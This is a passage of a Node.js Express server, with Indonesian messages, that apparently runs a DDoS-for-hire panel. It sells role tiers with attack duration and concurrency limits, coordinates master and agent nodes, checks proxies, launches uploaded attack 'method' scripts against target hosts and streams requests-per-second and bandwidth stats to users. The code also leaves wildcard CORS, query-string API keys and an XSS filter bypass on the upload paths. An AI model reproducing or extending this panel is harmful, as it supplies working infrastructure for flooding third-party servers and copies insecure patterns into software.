  max: 50,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterRegister = rateLimit({
  windowMs: 30 * 60 * 1000,
  max: 100,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterShell = rateLimit({
  windowMs: 5 * 60 * 1000,
  max: 30,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterAttack = rateLimit({
  windowMs: 60 * 1000,
  max: 600,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterAgentRegister = rateLimit({
  windowMs: 60 * 1000,
  max: 3000,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterProxyCallback = rateLimit({
  windowMs: 60 * 1000,
  max: 1200,
  standardHeaders: true,
  legacyHeaders: false
});
const limiterProxyChecker = rateLimit({
  windowMs: 60 * 1000,
  max: 600,
  standardHeaders: true,
  legacyHeaders: false
});

function validateApiKey(req, res, next) {
  const headerKey = req.headers['x-api-key'] || req.headers['X-API-Key'];
  const bodyKey = req.body?.key;
  const key = headerKey || req.query.key || bodyKey;
  if (!key) return res.status(400).json({ error: 'API key wajib disediakan' });
  if (key !== apiKey && key !== AGENT_KEY) {
    return res.status(403).json({ error: 'API key tidak valid' });
  }
  next();
}

function validateBlacklist(req, res, next) {
  const host = req.query.host || req.body.host;
  if (!host)
    return res.status(400).json({ error: 'Target host/IP tidak disediakan' });
  if (isBlacklisted(host)) {
    return res
      .status(403)
      .json({ error: `Target "${host}" masuk daftar blacklist.` });
  }
  next();
}

function validateFileName(req, res, next) {
  const filename =
    req.params.filename || req.body.filename || req.body.newName;
  if (!isValidFileName(filename))
    return res.status(400).json({ error: 'Nama file tidak valid' });
  next();
}

function requireAdmin(req, res, next) {
  if (!req.user || req.user.role !== 'admin') {
    const accept = req.headers['accept'] || '';
    if (accept.includes('application/json') || req.path.startsWith('/api/')) {
      return res.status(403).json({ error: 'Admin only' });
    }
    return res.redirect('/admin-only');
  }
  next();
}

function requireRoleLimit() {
  const roleLimits = {
    basic: { minTime: 1, maxTime: 60, maxConcurrent: 2 },
    vip: { minTime: 1, maxTime: 300, maxConcurrent: 5 },
    vvip: { minTime: 1, maxTime: 750, maxConcurrent: 10 },
    mvp: { minTime: 1, maxTime: 1800, maxConcurrent: 15 },
    admin: { minTime: 0, maxTime: Infinity, maxConcurrent: Infinity }
  };

  return async (req, res, next) => {
    if (NODE_TYPE === 'agent') return next();
    if (!supabase)
      return res
        .status(503)
        .json({ error: 'Layanan autentikasi belum siap. Coba lagi.' });

    const { time, concurrent, user } = req.query;
    if (!user) {
      req.userRole = 'basic';
      return next();
    }

    await withUserCooldownLock(user, async () => {
      const { data, error } = await supabase
        .from('users')
        .select('role, banned, expired_at, custom_concurrent, custom_time')
        .eq('username', user)
        .single();

      if (error || !data)
        return res.status(403).json({ error: 'User tidak dikenali' });
      if (data.banned)
        return res.status(403).json({ error: 'Akun ini diblokir' });

      if (
        ['vip', 'vvip', 'mvp'].includes(data.role) &&
        data.expired_at &&
        new Date(data.expired_at) < new Date()
      ) {
        return res.status(403).json({ error: 'Akun ini telah expired' });
      }

      const role = data.role || 'basic';
      req.userRole = role;

      const cooldownPerRole = {
        basic: 120,
        vip: 80,
        vvip: 65,
        mvp: 45,
        admin: 0
      };
      const now = Date.now();
      const last = lastAttackTimestamps[user];
      const cooldown = cooldownPerRole[role] || 10;

      if (last && now - last < cooldown * 1000) {
        const remaining = ((cooldown * 1000 - (now - last)) / 1000).toFixed(1);
        return res
          .status(429)
          .json({ error: `Tunggu ${remaining}s sebelum serangan berikutnya` });
      }

      lastAttackTimestamps[user] = now;

      const limits = { ...roleLimits[role] };
      if (!isNaN(data.custom_time)) limits.maxTime = data.custom_time;
      if (!isNaN(data.custom_concurrent))
        limits.maxConcurrent = data.custom_concurrent;

      const duration = parseInt(time, 10);
      const reqConcurrent = parseInt(concurrent, 10);

      if (limits.maxTime !== Infinity && duration > limits.maxTime) {
        return res.status(400).json({
          error: `Durasi maksimal untuk ${role.toUpperCase()} adalah ${
            limits.maxTime
          } detik`
        });
      }
      if (!isNaN(reqConcurrent) && reqConcurrent > limits.maxConcurrent) {
        return res.status(400).json({
          error: `Maksimal concurrent untuk ${role.toUpperCase()} adalah ${
            limits.maxConcurrent
          }`
        });
      }
      next();
    });
  };
}

function disableIfAgent(message = 'Fitur ini hanya tersedia di node master') {
  return (req, res, next) => {
    if (NODE_TYPE === 'agent')
      return res.status(403).json({ error: message });
    next();
  };
}

async function requireLogin(req, res, next) {
  if (!supabase)
    return res.status(503).json({ error: 'Layanan autentikasi belum siap' });

  const signed = req.cookies?.user;
  if (!signed) return res.redirect('/login');

  const unsigned = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!unsigned) return res.redirect('/login');

  const { data: user, error } = await supabase
    .from('users')
    .select('username, role, banned, expired_at')
    .eq('username', unsigned)
    .single();

  if (error || !user) return res.redirect('/login');
  if (user.banned === true) return res.redirect('/banned');

  req.user = user;
  next();
}

function validateKeyAndLogin(req, res, next) {
  validateApiKey(req, res, () => requireLogin(req, res, next));
}

/* =============================================================================
 * 11) EXPRESS MIDDLEWARE: BODY, SECURITY, STATIC, COOKIE, ONLINE TRACKER
 * ========================================================================== */

// XSS middleware dengan pengecualian
const _xssMiddleware = xss();
function conditionalXss(req, res, next) {
  try {
    if (
      req.path &&
      (req.path.startsWith('/api/method') ||
        req.path.startsWith('/lib/method'))
    ) {
      return next();
    }
    return _xssMiddleware(req, res, next);
  } catch {
    return next();
  }
}

// Body parser & compression
app.use(express.json({ limit: '50mb' }));
app.use(
  compression({
    filter: (_req, res) => {
      const type = res.getHeader('Content-Type');
      return Boolean(type && String(type).includes('application/json'));
    }
  })
);
app.use(conditionalXss);

// CORS & cache
app.use((req, res, next) => {
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader(
    'Access-Control-Allow-Methods',
    'GET, POST, PUT, DELETE, OPTIONS'
  );
  res.setHeader(
    'Access-Control-Allow-Headers',
    'Content-Type, Authorization, X-API-Key, x-api-key'
  );
  res.setHeader('Cache-Control', 'public, max-age=5');
  if (req.method === 'OPTIONS') return res.sendStatus(204);
  next();
});

// Header hardening
app.use((req, res, next) => {
  res.setHeader('X-Content-Type-Options', 'nosniff');
  res.setHeader('X-Frame-Options', 'DENY');
  res.setHeader('Referrer-Policy', 'no-referrer');
  res.setHeader(
    'Permissions-Policy',
    'geolocation=(), microphone=(), camera=()'
  );
  next();
});

// Static files
app.use('/uploads', express.static(path.join(__dirname, 'web', 'uploads')));
app.use('/lib/method', express.static(uploadDir));

app.use(cookieParser());

// Redirect bila user dibanned
app.use(async (req, res, next) => {
  if (!supabase) return next();
  const signed = req.cookies?.user;
  if (!signed) return next();

  const unsigned = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!unsigned) return next();

  const { data: user, error } = await supabase
    .from('users')
    .select('banned')
    .eq('username', unsigned)
    .single();

  if (error || !user) return next();

  const isBanned = user.banned === true;
  const isBannedPage = req.path === '/banned';

  if (isBanned && !isBannedPage) return res.redirect('/banned');
  if (!isBanned && isBannedPage) return res.redirect('/');

  next();
});

// Online users tracker
app.use(async (req, res, next) => {
  const signed = req.cookies?.user;
  if (!signed) return next();

  const username = cookieSignature.unsign(signed, COOKIE_SECRET);
  if (!username) return next();

  const ip =
    req.headers['x-forwarded-for']?.split(',')[0] ||
    req.connection.remoteAddress ||
    req.socket.remoteAddress;

  const userAgent = req.headers['user-agent'] || 'unknown';
  const now = Date.now();
  const onlineUsers = readFileJsonSafe(onlineUserPath, {});
  const prev = onlineUsers[username];
  const prevSeen = prev?.lastSeen || now;
  const ping = now - prevSeen > 10000 ? 999 : now - prevSeen;

  onlineUsers[username] = {
    ip,
    userAgent,
    path: req.path,
    lastSeen: now,
    ping
  };

  writeFileJsonSafe(onlineUserPath, onlineUsers);
  next();
});

/* =============================================================================
 * 12) WEBSOCKET SETUP & BROADCAST HELPERS
 * ========================================================================== */

const wss = new WebSocket.Server({ server: httpServer });
global.wss = wss;

const clients = new Set();

wss.on('connection', (ws) => {
  ws.isAlive = true;
  ws.plugins = {};
  ws.lastStatsSent = {};
  clients.add(ws);

  for (const pluginName in loadedPlugins) {
    if (loadedPlugins[pluginName].onConnect) {
      try {
        loadedPlugins[pluginName].onConnect(ws);
      } catch (e) {
        logActivity('PLUGIN_ONCONNECT_ERROR', {
          plugin: pluginName,
          error: e.message
        });
      }
    }
  }

  ws.on('pong', () => {
    ws.isAlive = true;
  });

  ws.on('close', () => {
    for (const pluginName in loadedPlugins) {
      if (loadedPlugins[pluginName].onDisconnect) {
        try {
          loadedPlugins[pluginName].onDisconnect(ws);
        } catch (e) {
          logActivity('PLUGIN_ONDISCONNECT_ERROR', {
            plugin: pluginName,
            error: e.message
          });
        }
      }
    }
    clients.delete(ws);
  });

  ws.on('error', (err) => {
    logActivity('WS_CLIENT_ERROR', { error: err.message });
    try {
      ws.close();
    } catch {}
    clients.delete(ws);
  });

  ws.on('message', (msg) => {
    try {
      const data = JSON.parse(msg);
      if (data.plugin && loadedPlugins[data.plugin]) {
        if (loadedPlugins[data.plugin].handleMessage) {
          try {
            loadedPlugins[data.plugin].handleMessage(ws, data);
          } catch (e) {
            logActivity('PLUGIN_HANDLE_MESSAGE_ERROR', {
              plugin: data.plugin,
              error: e.message
            });
          }
        }
        return;
      }
    } catch (e) {
      logActivity('WS_MESSAGE_PARSE_ERROR', { error: e.message });
      ws.close(1003, 'Format pesan tidak valid');
    }
  });
});

function broadcastWS(data) {
  const message = JSON.stringify(data);
  for (const client of clients) {
    if (client.readyState === WebSocket.OPEN) {
      try {
        if (client.bufferedAmount > 1_000_000) {
          continue;
        }
        client.send(message);
      } catch {
        client.terminate();
        clients.delete(client);
      }
    }
  }
}

// Debounce WS updates untuk agent status
const WS_DEBOUNCE_MS = 250;
let pendingAgentUpdates = [];
let wsTimer = null;

function enqueueAgentUpdates(updates) {
  pendingAgentUpdates.push(...updates);
  if (wsTimer) return;
  wsTimer = setTimeout(() => {
    const batch = pendingAgentUpdates;
    pendingAgentUpdates = [];
    wsTimer = null;
    if (batch.length)
      broadcastWS({ type: 'agent_status_bulk_update', updates: batch });
  }, WS_DEBOUNCE_MS);
}

// WS keepalive
setInterval(() => {
  for (const ws of clients) {
    if (ws.isAlive === false) {
      ws.terminate();
      clients.delete(ws);
      continue;
    }
    ws.isAlive = false;
    try {
      ws.ping();
    } catch {
      ws.terminate();
      clients.delete(ws);
    }
  }
}, 30000);

/* =============================================================================
 * 13) FRONTEND PAGES ROUTES
 * ========================================================================== */

app.get('/', disableIfAgent(), (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'index.html'))
);
app.get('/login', disableIfAgent(), (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'login.html'))
);
app.get('/register', disableIfAgent(), (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'register.html'))
);
app.get(
  '/usermanager',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  (req, res) =>
    res.sendFile(path.join(__dirname, 'web', 'usermanager.html'))
);
app.get(
  '/adminpanel',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  (req, res) =>
    res.sendFile(path.join(__dirname, 'web', 'adminpanel.html'))
);
app.get('/dashboard', disableIfAgent(), requireLogin, (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'dashboard.html'))
);
app.get('/profile', disableIfAgent(), requireLogin, (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'profile.html'))
);
app.get('/banned', disableIfAgent(), (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'banned.html'))
);
app.get('/admin-only', disableIfAgent(), requireLogin, (req, res) =>
  res.sendFile(path.join(__dirname, 'web', 'admin-only.html'))
);

/* =============================================================================
 * 14) NEWS & BROADCAST
 * ========================================================================== */

function saveNews(news) {
  const list = readFileJsonSafe(newsPath, []);
  list.unshift({ news, at: new Date().toISOString() });
  writeFileJsonSafe(newsPath, list);
}

app.post(
  '/api/broadcast-news',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  async (req, res) => {
    const { news } = req.body;
    if (!news) return res.status(400).json({ error: 'Konten berita diperlukan' });

    saveNews(news);
    broadcastWS({ type: 'broadcast_news', news });
    res.json({ message: 'Berita berhasil disiarkan' });
  }
);

app.get('/api/news', disableIfAgent(), requireLogin, (_req, res) =>
  res.json(readFileJsonSafe(newsPath, []))
);

/* =============================================================================
 * 15) AUTH & USER MANAGEMENT ROUTES
 * ========================================================================== */

// /api/me
app.get('/api/me', disableIfAgent(), requireLogin, async (req, res) => {
  try {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });
    const { data, error } = await supabase
      .from('users')
      .select('username, role, photo_url, expired_at, custom_concurrent, custom_time')
      .eq('username', req.user.username)
      .single();

    if (error) return res.status(500).json({ error: error.message });

    const cooldownMap = { basic: 120, vip: 80, vvip: 65, mvp: 45, admin: 0 };
    const role = data.role || 'basic';
    const cooldown = cooldownMap[role] ?? 60;

    res.json({
      ...data,
      cooldown,
      expired_at: data.expired_at || null,
      custom_concurrent: data.custom_concurrent ?? null,
      custom_time: data.custom_time ?? null
    });
  } catch (e) {
    res.status(500).json({ error: e.message });
  }
});

// Auth helper
async function authenticateUser(username, password) {
  if (!supabase) return null;
  const { data, error } = await supabase
    .from('users')
    .select('username, password, role')
    .eq('username', username)
    .single();
  if (error || !data) return null;
  const match = await bcrypt.compare(password, data.password);
  if (!match) return null;
  return data;
}

// /api/login
app.post('/api/login', limiterLogin, async (req, res) => {
  if (!supabase)
    return res.status(503).json({ error: 'Layanan autentikasi belum siap' });

  const { username, password } = req.body;
  const user = await authenticateUser(username, password);
  if (!user)
    return res.status(401).json({ error: 'Username atau password salah' });

  const signedUser = cookieSignature.sign(username, COOKIE_SECRET);

  const THREE_DAYS_MS = 3 * 24 * 60 * 60 * 1000;
  res.cookie('user', signedUser, {
    httpOnly: true,
    maxAge: THREE_DAYS_MS,
    secure: IS_PROD,
    sameSite: COOKIE_SAMESITE,
    domain: COOKIE_DOMAIN
  });

  res.json({ message: 'Login berhasil', role: user.role, username: user.username });
});

// /api/logout
app.post('/api/logout', disableIfAgent(), requireLogin, (req, res) => {
  res.clearCookie('user', {
    httpOnly: true,
    secure: IS_PROD,
    sameSite: COOKIE_SAMESITE,
    domain: COOKIE_DOMAIN
  });
  res.json({ message: 'Logout berhasil' });
});

// Profile upload
const profileStorage = multer.diskStorage({
  destination: (_req, _file, cb) =>
    cb(null, path.join(__dirname, 'web', 'uploads')),
  filename: (req, file, cb) => {
    const ext = path.extname(file.originalname);
    const safeName = req.user.username.replace(/[^a-z0-9]/gi, '_');
    cb(null, safeName + ext);
  }
});
const profileUpload = multer({ storage: profileStorage });

app.post(
  '/api/profile/update',
  disableIfAgent(),
  requireLogin,
  profileUpload.single('photo'),
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });

    const { username, password } = req.body;
    const photo_url = req.file ? `/uploads/${req.file.filename}` : undefined;

    const updates = {};
    if (username && username !== req.user.username) updates.username = username;
    if (password && password.length >= 6)
      updates.password = await bcrypt.hash(password, 10);
    if (photo_url) updates.photo_url = photo_url;

    if (Object.keys(updates).length === 0)
      return res.status(400).json({ error: 'Tidak ada perubahan' });

    if (updates.username) {
      const { data: existing } = await supabase
        .from('users')
        .select('username')
        .eq('username', updates.username)
        .neq('username', req.user.username)
        .maybeSingle();
      if (existing)
        return res.status(409).json({ error: 'Username sudah dipakai' });
    }

    const { error } = await supabase
      .from('users')
      .update(updates)
      .eq('username', req.user.username);
    if (error) return res.status(500).json({ error: error.message });

    res.json({ message: 'Profil berhasil diperbarui', photo_url });
  }
);

// /api/register
app.post('/api/register', limiterRegister, disableIfAgent(), async (req, res) => {
  if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });

  const { username, password } = req.body;
  if (!username || !password || username.length < 3 || password.length < 6) {
    return res.status(400).json({
      error: 'Username minimal 3 karakter & password minimal 6 karakter'
    });
  }
  if (!/^[a-zA-Z0-9_\-\.]+$/.test(username)) {
    return res.status(400).json({
      error: 'Username hanya boleh huruf, angka, underscore, dash, titik.'
    });
  }

  try {
    const hashedPassword = await bcrypt.hash(password, 10);
    const { error: insertError } = await supabase.from('users').insert([
      {
        username,
        password: hashedPassword,
        role: 'basic',
        custom_concurrent: 2,
        custom_time: 60
      }
    ]);

    if (insertError) {
      if ((insertError.message || '').toLowerCase().includes('duplicate')) {
        return res.status(409).json({ error: 'Username sudah digunakan' });
      }
      return res
        .status(500)
        .json({ error: 'Gagal mendaftar: ' + insertError.message });
    }
    res.json({ message: 'Registrasi berhasil' });
  } catch (e) {
    res.status(500).json({ error: 'Kesalahan server: ' + e.message });
  }
});

// /api/apikey untuk UI
app.get('/api/apikey', disableIfAgent(), requireLogin, (req, res) =>
  res.json({ apiKey, username: req.user.username })
);

// User management (admin)
app.get('/api/users', disableIfAgent(), requireLogin, requireAdmin, async (_req, res) => {
  if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });
  const { data, error } = await supabase
    .from('users')
    .select('username, role, banned, expired_at, custom_concurrent, custom_time');
  if (error) return res.status(500).json({ error: error.message });
  res.json(data);
});

app.get('/api/users/online', disableIfAgent(), requireLogin, requireAdmin, (_req, res) => {
  const data = readFileJsonSafe(onlineUserPath, {});
  const now = Date.now();
  const threshold = 5 * 60 * 1000;

  const online = Object.entries(data)
    .filter(([_, info]) => now - info.lastSeen < threshold)
    .map(([username, info]) => ({
      username,
      ip: info.ip,
      userAgent: info.userAgent,
      path: info.path,
      lastSeen: new Date(info.lastSeen).toLocaleString(),
      ping: info.ping || 0
    }));

  res.json({ online });
});

// Bersihkan online user lama
setInterval(() => {
  const users = readFileJsonSafe(onlineUserPath, {});
  const now = Date.now();
  const newUsers = {};
  for (const [u, info] of Object.entries(users)) {
    if (now - info.lastSeen < 2 * 60 * 1000) newUsers[u] = info;
  }
  writeFileJsonSafe(onlineUserPath, newUsers);
}, 5 * 60 * 1000);

app.post(
  '/api/users',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  express.json(),
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });
    const { username, password, role } = req.body;

    if (!username || !password || !role) {
      return res
        .status(400)
        .json({ error: 'Username, password, dan role wajib diisi' });
    }

    const { data: existing } = await supabase
      .from('users')
      .select('username')
      .eq('username', username)
      .maybeSingle();
    if (existing) return res.status(409).json({ error: 'Username sudah ada' });

    const hash = await bcrypt.hash(password, 10);
    const { error } = await supabase
      .from('users')
      .insert([{ username, password: hash, role }]);
    if (error) return res.status(500).json({ error: error.message });

    res.json({ message: 'User ditambahkan' });
  }
);

app.delete(
  '/api/users/:username',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });

    const username = req.params.username;
    if (!username)
      return res.status(400).json({ error: 'Username tidak valid' });

    const { error } = await supabase
      .from('users')
      .delete()
      .eq('username', username);
    if (error) return res.status(500).json({ error: error.message });

    res.json({ message: 'User dihapus' });
  }
);

app.put(
  '/api/users/:username/role',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  express.json(),
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });

    const username = req.params.username;
    const { role } = req.body;
    if (!role) return res.status(400).json({ error: 'Role wajib diisi' });

    const { error } = await supabase
      .from('users')
      .update({ role })
      .eq('username', username);
    if (error) return res.status(500).json({ error: error.message });

    res.json({ message: 'Role diperbarui' });
  }
);

app.put(
  '/api/users/:username/password',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  express.json(),
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });
    const username = req.params.username;
    const { password } = req.body;

    if (!password || password.length < 6) {
      return res
        .status(400)
        .json({ error: 'Password minimal 6 karakter' });
    }

    const hash = await bcrypt.hash(password, 10);
    const { error } = await supabase
      .from('users')
      .update({ password: hash })
      .eq('username', username);
    if (error) return res.status(500).json({ error: error.message });

    res.json({ message: 'Password diperbarui' });
  }
);

/* =============================================================================
 * 16) SETTINGS & CONFIG (DANGEROUS KEYWORDS, BLACKLIST, USER SETTINGS)
 * ========================================================================== */

let DANGEROUS_KEYWORDS = readConfig()?.dangerous_keywords || [];

// Flags setting
app.get('/setting/toggle', disableIfAgent(), validateKeyAndLogin, (req, res) => {
  const { target, value } = req.query;
  if (target === 'autoDeleteAgent') {
    AUTO_DELETE_AGENT = value === 'true';
    return res.json({ success: true, AUTO_DELETE_AGENT });
  }
  if (target === 'masterAttackSelf') {
    MASTER_ATTACK_SELF = value === 'true';
    return res.json({ success: true, MASTER_ATTACK_SELF });
  }
  return res.status(400).json({ error: 'Invalid setting target' });
});

app.get('/setting/status', disableIfAgent(), validateKeyAndLogin, (_req, res) =>
  res.json({ AUTO_DELETE_AGENT, MASTER_ATTACK_SELF })
);

// Dangerous keywords
app.get(
  '/api/config/dangerous_keywords',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  (_req, res) => res.json(readConfig().dangerous_keywords || [])
);

app.post(
  '/api/config/dangerous_keywords',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  (req, res) => {
    const { keywords } = req.body;
    if (!Array.isArray(keywords))
      return res.status(400).json({ error: 'Invalid input' });

    const config = readConfig();
    config.dangerous_keywords = keywords;
    writeConfig(config);
    DANGEROUS_KEYWORDS = keywords;

    res.json({ success: true, updated: keywords.length });
  }
);

// Update pengaturan user (banned, expired, custom limit)
app.put(
  '/api/users/:username/settings',
  disableIfAgent(),
  requireLogin,
  requireAdmin,
  express.json(),
  async (req, res) => {
    if (!supabase) return res.status(503).json({ error: 'Layanan belum siap' });

    const { username } = req.params;
    const { banned, expired_at, custom_concurrent, custom_time } = req.body;

    const { error } = await supabase
      .from('users')
      .update({
        banned: banned === true,
        expired_at: expired_at ? new Date(expired_at).toISOString() : null,
        custom_concurrent: isNaN(custom_concurrent)
          ? null
          : custom_concurrent,
        custom_time: isNaN(custom_time) ? null : custom_time
      })
      .eq('username', username);

    if (error) return res.status(500).json({ error: error.message });
    res.json({ message: 'Pengaturan user diperbarui' });
  }
);

// Blacklist hosts
app.get(
  '/api/blacklist-hosts',
  disableIfAgent(),
  validateKeyAndLogin,
  (_req, res) => res.json({ list: readConfig().blacklist_hosts || [] })
);

app.post(
  '/api/blacklist-hosts',
  disableIfAgent(),
  validateKeyAndLogin,
  express.json(),
  (req, res) => {
    const { list } = req.body;
    if (!Array.isArray(list))
      return res.status(400).json({ error: 'Format tidak valid' });

    const config = readConfig();
    config.blacklist_hosts = list;
    writeConfig(config);
    logActivity('BLACKLIST_HOSTS_UPDATED', { total: list.length });
    res.json({ success: true });
  }
);

/* =============================================================================
 * 17) ATTACK: METHODS, HISTORY, PROCESS, STATS
 * ========================================================================== */

// Methods helpers
function readMethods() {
  const now = Date.now();
  if (_cachedMethods && now - _lastMethodsRead < METHOD_CACHE_TTL)
    return _cachedMethods;
  _cachedMethods = readFileJsonSafe(methodsPath, {});
  _lastMethodsRead = now;
  return _cachedMethods;
}

function writeMethods(methods) {
  if (typeof methods !== 'object' || methods === null) {
    throw new Error('Data methods tidak valid (bukan object)');
  }
  for (const [name, item] of Object.entries(methods)) {
    if (!item || typeof item !== 'object') {
      throw new Error(`Method "${name}" tidak valid (bukan object)`);
    }
    if (typeof item.script !== 'string' || !Array.isArray(item.args)) {
      throw new Error(
        `Method "${name}" harus punya "script" string dan "args" array`
      );
    }
  }
  writeFileJsonSafe(methodsPath, methods);
  _cachedMethods = methods;
  _lastMethodsRead = Date.now();
}

// History helpers
function readHistory() {
  return readFileJsonSafe(historyPath, []);
}

function writeHistory(history) {
  return debounceWrite(historyPath, history);
}

function logAttackHistory(entry) {
  const history = readHistory();
  history.unshift(entry);
  writeHistory(history);
}

function updateAttackHistory(processId, update) {
  const history = readHistory();
  const idx = history.findIndex((h) => h.processId === processId);
  if (idx !== -1) {
    Object.assign(history[idx], update);
    writeHistory(history);
  } else {
    logActivity('UPDATE_ATTACK_HISTORY_NOT_FOUND', { processId });
  }
}

function cleanupOldHistory(days = 7) {
  const history = readHistory();
  const threshold = Date.now() - days * 24 * 60 * 60 * 1000;
  const filtered = history.filter((entry) => {
    if (!entry.startTime) return true;
    const entryTime = new Date(entry.startTime).getTime();
    return entryTime >= threshold;
  });
  if (filtered.length !== history.length) {
    writeHistory(filtered);
    logActivity('CLEANUP_OLD_HISTORY', {
      removed: history.length - filtered.length,
      remaining: filtered.length
    });
  }
}

function isAgentIdle(agent) {
  const last = global.LAST_AGENT_STATUS[agent.name || agent.url];
  if (!last || !last.data || !last.data.processStats) return true;
  return Object.keys(last.data.processStats).length === 0;
}

// Agents file helpers
function loadAgents() {
  AGENT_LIST = readFileJsonSafe(agentsPath, []);
}
function saveAgents() {
  writeFileJsonSafe(agentsPath, AGENT_LIST);
}
async function saveAgentsAndFlush() {
  saveAgents();
  await flushAllWrites();
}

let _cachedAgentScores = null;
let _lastAgentScoreTime = 0;
const AGENT_SCORE_CACHE_TTL = 20 * 1000;

function getBestAgents(limit = 5, requireIdle = false) {
  const now = Date.now();
  if (_cachedAgentScores && now - _lastAgentScoreTime < AGENT_SCORE_CACHE_TTL) {
    return _cachedAgentScores.slice(0, limit);
  }

  const history = readHistory();
  const usageCount = {};
  const lastUsedTime = {};

  for (const entry of history) {
    const name = entry.agentName || entry.agent;
    if (!name) continue;
    usageCount[name] = (usageCount[name] || 0) + 1;
    const end = new Date(entry.endTime || entry.startTime).getTime();
    lastUsedTime[name] = Math.max(lastUsedTime[name] || 0, end);
  }

  const enabledAgents = AGENT_LIST.filter((a) => a.enabled !== false);

  const scored = enabledAgents
    .map((agent) => {
      const name = agent.name || agent.url;
      const status = LAST_AGENT_STATUS[name];
      if (!status || status.status !== 'success') return null;

      const procCount = status.data?.processStats
        ? Object.keys(status.data.processStats).length
        : 0;
      if (procCount >= 2) return null;
      if (requireIdle && procCount > 0) return null;

      const usage = usageCount[name] || 0;
      const lastUsed = lastUsedTime[name] || 0;
      const idle = (Date.now() - lastUsed) / 60000;
      const ping = status.data?.ping || 9999;
      const score = usage * 10 - idle + ping / 50;

      return { agent, score, procCount };
    })
    .filter(Boolean)
    .sort((a, b) => a.score - b.score)
    .map((x) => x.agent);

  _cachedAgentScores = scored;
  _lastAgentScoreTime = now;

  return scored.slice(0, limit);
}

// Process helpers
function isPidRunning(pid) {
  if (!pid || typeof pid !== 'number') return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch (err) {
    if (err.code === 'EPERM') return true;
    return false;
  }
}

function safeWithProcess(processId, fn) {
  try {
    if (!activeProcesses[processId]) return;
    const proc = activeProcesses[processId];
    if (!proc || !proc.ls) return;
    const pid = proc.ls.pid;

    if (!isPidRunning(pid)) {
      logActivity('STATS_CLEANUP_PID_GONE', { processId, pid });
      if (stats[processId]?._interval) clearInterval(stats[processId]._interval);
      if (activeProcesses[processId]?._watchdog)
        clearInterval(activeProcesses[processId]._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];
      return;
    }
    fn(proc, pid);
  } catch (e) {
    logActivity('STATS_LOOP_ERROR', {
      processId,
      error: e?.toString?.() ?? String(e)
    });
  }
}

function startStatsAggregator(processId) {
  if (!stats[processId]) return;
  if (stats[processId]._interval) return;

  stats[processId]._interval = setInterval(() => {
    safeWithProcess(processId, () => {
      try {
        const s = stats[processId];
        if (!s) return;

        const newS = {
          rps: s._tempRps || 0,
          pps: s._tempPps || 0,
          bps: Number(((s._tempBps || 0) / 1_000_000).toFixed(2))
        };

        s.rps = newS.rps;
        s.pps = newS.pps;
        s.bps = newS.bps;
        s._tempRps = 0;
        s._tempPps = 0;
        s._tempBps = 0;
        s.lastTick = Date.now();

        if (NODE_TYPE === 'master') {
          const payload = { rps: s.rps, pps: s.pps, bps: s.bps };
          if (clients.size > 0) {
            broadcastWS({
              type: 'attack_stats',
              processId,
              stats: payload
            });
          }
        }
      } catch (e) {
        logActivity('STATS_AGG_ERROR', { processId, error: e.toString() });
      }
    });
  }, 1000);
}

// Watchdog child process
function startProcessWatchdog(processId) {
  return setInterval(() => {
    const p = activeProcesses[processId];
    if (!p) return;
    const idle = Date.now() - (p.lastResponse || 0);
    if (idle > PROCESS_HEARTBEAT_TIMEOUT) {
      logActivity('PROCESS_HEARTBEAT_TIMEOUT', { processId, idle });
      try {
        p.ls?.kill('SIGTERM');
      } catch {}
      if (stats[processId]?._interval) clearInterval(stats[processId]._interval);
      if (p._watchdog) clearInterval(p._watchdog);
      delete stats[processId];
      delete activeProcesses[processId];
      updateAttackHistory(processId, {
        endTime: new Date().toISOString(),
        status: 'timeout'
      });
      if (NODE_TYPE === 'master')
        broadcastWS({
          type: 'attack_stopped',
          processId,
          exitCode: 'heartbeat_timeout'
        });
      sendTelegramPhoto(
        `⏱️ Proses timeout\n🆔 \`${escapeTelegram(processId)}\``
      ).catch(() => {});
    }
  }, 3000);
}

function isSystemUnderPressure() {
  const { memoryUsagePercent } = getMemStats();
  return memoryUsagePercent >= MAX_MEMORY_PCT;
}

function spawnAttackScript(scriptName, args, processId) {
  const allowedExt = ['.js', '.sh'];
  const safeName = path.basename(scriptName);
  const ext = path.extname(safeName).toLowerCase();

  if (!allowedExt.includes(ext)) {
    const errMsg = `Ekstensi file tidak diizinkan: ${ext}`;
    logActivity('SPAWN_SCRIPT_INVALID_EXT', {
      processId,
      scriptName,
      safeName,
      ext
    });
    throw new Error(errMsg);
  }

  const scriptPath = path.resolve(uploadDir, safeName);
  if (!scriptPath.startsWith(path.resolve(uploadDir))) {
    const errMsg = `Akses ke path tidak diizinkan: ${scriptPath}`;
    logActivity('SPAWN_SCRIPT_PATH_ESCAPE', {
      processId,
      scriptName,
      safeName,
